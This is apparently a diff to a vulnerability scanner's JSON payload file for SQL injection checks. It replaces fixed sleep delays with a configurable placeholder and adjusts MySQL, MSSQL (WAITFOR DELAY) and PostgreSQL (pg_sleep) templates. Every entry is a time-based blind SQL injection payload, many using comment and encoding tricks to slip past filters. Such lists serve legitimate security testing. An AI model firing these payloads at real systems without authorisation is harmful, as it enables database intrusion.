@@ -3,14 +3,14 @@
     "vulnerability": "PTV-WEB-SANIT-SQLINJ",
     "payloads": [
         {
-            "payload": "' OR sleep(7) OR 'a'='",
+            "payload": "' OR sleep(PTINJECTORDELAY) OR 'a'='",
             "verify": [
                 7
             ],
             "type": "time"
         },
         {
-            "payload": "' AND sleep(7) OR 'a'='",
+            "payload": "' AND sleep(PTINJECTORDELAY) OR 'a'='",
             "verify": [
                 7
             ],
@@ -19,47 +19,47 @@
         {
             "payload": [
 
-                " QUOTE  'XOR(if(now()=sysdate(),sleep(7),0))XOR'  QUOTE",
-                "'%E2%84%A2' QUOTE '/*F*/' OP '/*f*/sleep(7)=' QUOTE ",
-                "'%E2%84%A2' QUOTE ')/*F*/' OP '/*f*/sleep(7)=' QUOTE",
-                "'%E2%84%A2 QUOTE )/*F*/' OP '/*f*/sleep(7)=' QUOTE",
-                " OP '(if(now()=sysdate(),sleep(7),0))' OP '%23'",
-                " QUOTE  OP  'sleep(7)--#'",
-                " QUOTE  OP  'sleep(7)#'",
-                " QUOTE  OP  'sleep(7)=' QUOTE '#'",
-                " QUOTE  OP  'sleep(7)=' QUOTE '--'",
+                " QUOTE  'XOR(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))XOR'  QUOTE",
+                "'%E2%84%A2' QUOTE '/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE ",
+                "'%E2%84%A2' QUOTE ')/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE",
+                "'%E2%84%A2 QUOTE )/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE",
+                " OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))' OP '%23'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY)--#'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY)#'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY)=' QUOTE '#'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY)=' QUOTE '--'",
 
-                " QUOTE  OP  'sleep(7)--%23'",
-                " QUOTE  OP  'sleep(7)%23'",
-                " QUOTE  OP  'sleep(7);%00'",
-                " OP  'sleep(7)--+-'",
-                " OP  'sleep(7)#'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)--#'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)#'",
-                " OP  'sleep(7)%23'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)--%23'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)%23'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7);%00'",
-                " OP '/*f*/sleep/*f*/(7)--+-'",
-                " OP '/*f*/sleep/*f*/(7)#'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY)--%23'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY)%23'",
+                " QUOTE  OP  'sleep(PTINJECTORDELAY);%00'",
+                " OP  'sleep(PTINJECTORDELAY)--+-'",
+                " OP  'sleep(PTINJECTORDELAY)#'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)--#'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)#'",
+                " OP  'sleep(PTINJECTORDELAY)%23'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)--%23'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)%23'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY);%00'",
+                " OP '/*f*/sleep/*f*/(PTINJECTORDELAY)--+-'",
+                " OP '/*f*/sleep/*f*/(PTINJECTORDELAY)#'",
 
-                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))--#'",
-                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))#'",
-                " OP' /*f*/sleep/*f*/(7)%23'",
-                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))--%23'",
-                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))%23'",
-                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0));%00'",
-                " OP '(if(now()=sysdate(),sleep(7),0))--+-'",
-                " OP '(if(now()=sysdate(),sleep(7),0))#'",
-                " OP '(if(now()=sysdate(),sleep(7),0))%23'",
-                "'\\/*F*/' OP '/*f*/sleep(7)%23'",
-                "'\\)/*F*/' OP '/*f*/sleep(7)%23'",
-                "'\\)/*F*/' OP '/*f*/sleep(7)%23'",
-                "'%E2%84%A2%27/*F*/' OP '/*f*/sleep(7)%23'",
-                "'%E2%84%A2%22/*F*/' OP '/*f*/sleep(7)%23'",
-                "'%E2%84%A2%22/*F*/' OP '/*f*/sleep(7)--+-'",
-                "'%E2%84%A2\\)/*F*/' OP '/*f*/sleep(7)--+-'",
-                "'%E2%84%A2%27)/*F*/' OP '/*f*/sleep(7)--+-'"
+                " QUOTE  OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))--#'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))#'",
+                " OP ' /*f*/sleep/*f*/(PTINJECTORDELAY)%23'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))--%23'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))%23'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0));%00'",
+                " OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))--+-'",
+                " OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))#'",
+                " OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))%23'",
+                "'\\/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)%23'",
+                "'\\)/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)%23'",
+                "'\\)/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)%23'",
+                "'%E2%84%A2%27/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)%23'",
+                "'%E2%84%A2%22/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)%23'",
+                "'%E2%84%A2%22/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)--+-'",
+                "'%E2%84%A2\\)/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)--+-'",
+                "'%E2%84%A2%27)/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)--+-'"
 
             ],
             "verify": [
@@ -76,24 +76,22 @@
         },
         {
             "payload": [
-                "start 'WAITFORDELAY' QUOTE '0:0:7' end"
+                "start ' WAITFOR DELAY ' QUOTE 'PTINJECTORDELAYHOURS:PTINJECTORDELAYMINUTES:PTINJECTORDELAYSECONDS.PTINJECTORDELAYMILLISECONDS' QUOTE end"
             ],
-            "verify": [
-                7
-            ],
-            "type": "time",
+            "verify": [7],
+            "type": "TIME",
             "technologies": ["microsoftsql"],
-            "tags":["payload_template"],
-            "vars":{
-                "start": ["", "'"],
+            "tags": ["payload_template"],
+            "vars": {
+                "start": [";", "';"],
                 "QUOTE": ["'"],
-                "end": [";%00","#","%23",";%00","--+-","='","#","%23","--+-"],
+                "end": ["-- ", ";-- "],
                 "encoding": ["none", "quote"]
             }
         },
         {
             "payload": [
-                "{QUOTE, ''} '/*F*/' OP '/*F*/ pg_sleep(7)' end"
+                "{QUOTE, ''} '/*F*/' OP '/*F*/ pg_sleep(PTINJECTORDELAY)' end"
             ],
             "verify": [
                 7
